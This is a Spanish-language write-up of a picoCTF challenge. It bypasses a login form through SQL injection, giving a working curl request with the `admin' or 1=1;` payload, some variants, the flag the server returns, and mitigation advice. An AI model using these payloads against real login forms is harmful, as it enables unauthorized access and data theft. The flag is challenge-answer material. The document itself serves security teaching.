## Descripción

Página con un formulario de login vulnerable a inyección SQL. El objetivo es acceder al panel (bypassear el login) y obtener la bandera que el servidor muestra tras autenticarse.

URL del reto: `http://fickle-tempest.picoctf.net:63941`

## Solución

La aplicación valida las credenciales en el servidor sin sanitizar correctamente el parámetro `username`, por lo que una condición siempre verdadera en la cláusula WHERE permite autenticarse sin conocer la contraseña.

Ejemplo reproducible con `curl` (inyección clásica `OR 1=1`):

```bash
# Petición POST que fuerza la condición a true
curl -s -X POST -d "username=admin' or 1=1;&password=whatever" http://fickle-tempest.picoctf.net:63941/login.php -i
```

Salida (parte relevante):

```
<h1>Logged in!</h1>
<p>Your flag is: picoCTF{s0m3_SQL_85832275}</p>
```

También funcionan otras variantes comunes como `admin'--` o `admin' ;` según cómo el servidor concatene la consulta SQL.

## Notas

- Técnica: SQL Injection (autenticación). La inyección funciona porque el servidor construye la consulta SQL incorporando directamente el parámetro `username`.
- Riesgo real: en aplicaciones reales esta vulnerabilidad permite acceso no autorizado, extracción de datos y potencial escalado a control total de la base de datos.
- Mitigación: usar consultas parametrizadas (prepared statements), validar/escapar entradas y limitar privilegios de la cuenta de la base de datos.

## Referencias

- SQL Injection (ejemplos): https://www.w3schools.com/sql/sql_injection.asp
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
